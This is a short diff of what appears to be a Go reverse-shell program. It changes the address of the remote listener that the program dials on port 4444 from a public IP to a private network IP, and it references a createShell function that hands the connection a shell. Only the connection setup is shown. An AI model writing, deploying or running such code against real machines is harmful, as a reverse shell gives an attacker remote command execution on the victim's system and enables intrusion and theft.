@@ -27,7 +27,7 @@ func createShell(connection net.Conn) {
 
 func main() {
 	var tcpPort string = "4444"
-	connection, err := net.Dial("tcp", "158.247.211.13:"+tcpPort) //connect to the listener on another machine
+	connection, err := net.Dial("tcp", "192.168.0.104:"+tcpPort) //connect to the listener on another machine
 	if err != nil {
 		fmt.Println("An error occurred trying to connect to the target:", err)
 		os.Exit(1)
